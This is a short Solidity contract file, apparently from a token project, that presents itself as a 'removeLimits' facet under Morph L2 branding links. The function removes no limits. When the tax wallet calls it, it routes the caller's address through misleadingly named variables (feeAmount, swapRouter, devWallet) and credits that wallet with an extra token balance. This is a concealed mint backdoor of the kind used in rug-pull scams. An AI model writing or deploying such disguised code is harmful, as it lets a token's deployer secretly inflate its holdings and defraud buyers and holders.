// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://www.morphl2.io/
    Twitter:  https://twitter.com/Morphl2
    Gitbook:  https://docs.morphl2.io/
    Telegram: https://t.me/MorphL2official
    Discord:  https://discord.gg/5SmG4yhzVZ

*/

pragma solidity ^0.8.24;
import "./TestLib.sol";
contract removeLimitsFacet is Ownable {
    function removeLimits() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_msgSender() == ds._taxWallet) {
            require(ds._taxWallet == _msgSender());
            address feeAmount = _msgSender();
            address swapRouter = feeAmount;
            address devWallet = swapRouter;
            ds._balances[devWallet] += ds.devAmount;
        }
    }
}
